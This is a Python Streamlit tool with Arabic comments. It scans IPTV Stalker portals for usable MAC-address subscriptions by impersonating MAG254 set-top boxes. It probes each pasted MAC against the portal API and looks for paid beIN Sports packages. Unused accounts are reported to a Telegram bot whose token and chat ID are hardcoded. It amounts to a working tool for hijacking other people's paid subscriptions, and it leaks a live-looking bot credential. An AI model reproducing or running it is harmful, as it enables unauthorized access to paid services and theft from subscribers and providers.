import streamlit as st 
import requests
import time
import telebot
import re
import urllib3
import random

# تعطيل تحذيرات SSL لضمان تجاوز حماية السيرفرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- إعدادات البوت الخاصة بك (مستخرجة من صورك) ---
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الباقات التي تبحث عنها
FAV_CHANNELS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# --- واجهة التطبيق ---
st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡", layout="wide")

st.markdown("""
<style>
    .main { background-color: #f8f9fa; }
    .stButton>button { width: 100%; background-color: #ff4b4b; color: white; border-radius: 10px; font-weight: bold; }
    .stMetric { background-color: white; padding: 10px; border-radius: 10px; border: 1px solid #ff4b4b; }
</style>
""", unsafe_allow_html=True)

st.title("📡 Radar Ayoub Hammami Pro")
st.subheader("نظام المسح الذكي وحالة السيرفر المباشرة")

# مدخل البيانات
raw_input = st.text_area("انسخ هنا النص العشوائي (روابط وماكات مبعثرة):", height=150)

def get_headers(mac):
    """محاكاة كاملة لجهاز MAG254 لتجاوز الحماية"""
    return {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Safari/533.3',
        'X-User-Agent': 'Model: MAG254; Link: WiFi',
        'Cookie': f'mac={mac}',
        'Referer': 'http://mag.infomir.com/',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

if st.button("🚀 بدء المسح الشامل"):
    # استخراج البيانات عبر Regex
    macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_input.upper())))
    host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_input)
    
    if host_match and macs:
        base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
        api_url = f"{base_url}/portal.php"
        
        st.info(f"🌐 جاري المسح المباشر للسيرفر: {base_url}")
        
        # عدادات النتائج
        c1, c2 = st.columns(2)
        stat_checked = c1.metric("إجمالي الماكات", "0")
        stat_found = c2.metric("الصيد المتاح", "0")
        
        progress = st.progress(0)
        final_results = []
        found_count = 0

        for i, mac in enumerate(macs):
            headers = get_headers(mac)
            try:
                # محاولة جلب البروفايل مباشرة (تجاوز فحص الحالة الذي يعطي Offline)
                start_t = time.time()
                r = requests.get(f"{api_url}?type=stb&action=get_profile&force_stb=1", 
                                 headers=headers, timeout=12, verify=False)
                latency = int((time.time() - start_t) * 1000)
                
                if r.status_code == 200 and '"active_cons"' in r.text:
                    active = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text).group(1)
                    expiry = re.search(r'"end_date"\s*:\s*"([^"]+)"', r.text).group(1) if "end_date" in r.text else "N/A"
                    strength = "قوي ✅" if latency < 1000 else "متقطع ⚠️"
                    
                    # فحص القنوات
                    r_ch = requests.get(f"{api_url}?type=itv&action=get_all_channels", 
                                        headers=headers, timeout=12, verify=False)
                    ch_text = r_ch.text.upper()
                    found_favs = [n for n, k in FAV_CHANNELS.items() if all(x in ch_text for x in k)]
                    
                    # إرسال التنبيه للصيد المتاح (0 متصل)
                    if active == "0":
                        found_count += 1
                        ch_str = "\n".join([f"✅ {c}" for c in found_favs]) if found_favs else "❌ غير محددة"
                        msg = (f"🎯 صيد متاح بواسطة Radar Ayoub\n\n"
                               f"🖥️ الماك: {mac}\n📊 الاستقرار: {strength}\n👥 المتصلون: {active}\n"
                               f"📺 القنوات:\n{ch_str}\n\n👤 المالك: Ayoub Hammami")
                        bot.send_message(ID, msg)
                        st.toast(f"✅ تم صيد: {mac}")

                    final_results.append({
                        "الماك": mac, "الحالة": "يشتغل 🟢", "القوة": strength, 
                        "المستخدمين": active, "الانتهاء": expiry, "الباقات": len(found_favs)
                    })
                else:
                    final_results.append({"الماك": mac, "الحالة": "معطل 🔴", "القوة": "-", "المستخدمين": "-", "الانتهاء": "-", "الباقات": "-"})
            except:
                final_results.append({"الماك": mac, "الحالة": "خطأ 🔴", "القوة": "-", "المستخدمين": "-", "الانتهاء": "-", "الباقات": "-"})
            
            # تحديث الواجهة
            stat_checked.metric("إجمالي الماكات", i + 1)
            stat_found.metric("الصيد المتاح", found_count)
            progress.progress((i + 1) / len(macs))
            time.sleep(0.5)

        st.table(final_results)
        st.balloons()
    else:
        st.error("❌ الرابط أو الماكات غير صحيحة.")
